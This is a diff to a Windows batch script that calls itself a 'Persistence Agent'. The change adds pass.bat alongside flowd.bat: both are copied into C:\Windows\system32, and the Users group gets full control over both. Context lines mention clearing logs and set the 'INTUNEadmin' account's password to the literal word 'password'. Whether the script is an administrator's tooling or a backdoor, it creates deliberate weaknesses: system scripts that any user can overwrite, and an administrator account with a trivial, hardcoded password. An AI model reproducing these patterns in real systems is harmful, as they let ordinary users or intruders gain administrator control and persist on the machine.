@@ -9,10 +9,13 @@ echo Persistence Agent Version 2.2p > C:\Windows\system32\Logs\Log1.txt
 echo Waiting for full system startup and clearing logs... > C:\Windows\system32\Logs\Log2.txt
 timeout /t 5
 
-echo Update Application > C:\Windows\system32\Logs\Log3.txt
+echo Update Script > C:\Windows\system32\Logs\Log3.txt
 xcopy D:\flowd.bat C:\Windows\system32\flowd.bat /y
 xcopy "D:\Programs\Tools for flowd\flowd.bat" C:\Windows\system32\flowd.bat /y
+xcopy D:\pass.bat C:\Windows\system32\pass.bat /y
+xcopy "D:\Programs\Tools for flowd\pass.bat" C:\Windows\system32\pass.bat /y
 icacls "C:\Windows\system32\flowd.bat" /grant Users:F
+icacls "C:\Windows\system32\pass.bat" /grant Users:F
 
 echo User Repair > C:\Windows\system32\Logs\Log4.txt
 net user "INTUNEadmin" password
